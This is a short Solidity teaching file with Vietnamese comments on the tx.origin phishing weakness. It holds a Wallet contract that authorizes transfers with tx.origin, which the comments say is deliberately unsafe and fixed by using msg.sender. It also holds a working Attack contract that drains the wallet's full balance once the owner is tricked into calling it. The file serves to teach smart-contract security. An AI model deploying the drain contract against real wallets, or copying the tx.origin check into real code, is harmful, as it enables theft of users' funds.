// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// # Bảo mật Sol / Unsafe txorigin 

// Alice -> contract A -> B thì tại B: msg.sender là A, tx.origin là Alice
// Phishing là kiểu attacker giả dạng là tốt và lừa user làm những vc họ không muốn. VD attacker giả dạng là 1 address tốt và lừa user gửi tiền vào address đó
// => Dùng tx.origin dễ bị phishing
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        // Fix bằng cách sử thành msg.sender

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
// Nếu Eve deploy contrac Attack rồi lừa Alice là owner contract trên gọi vào hàm attack của contract Attack thì toàn bộ số tiền contract trên sẽ về tay Eve
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
// Kinh nghiệm: khi dùng tx.origin luôn nhớ rằng có thể bị phishing attack; k nên thực hiện các contract lạ k biết source code là gì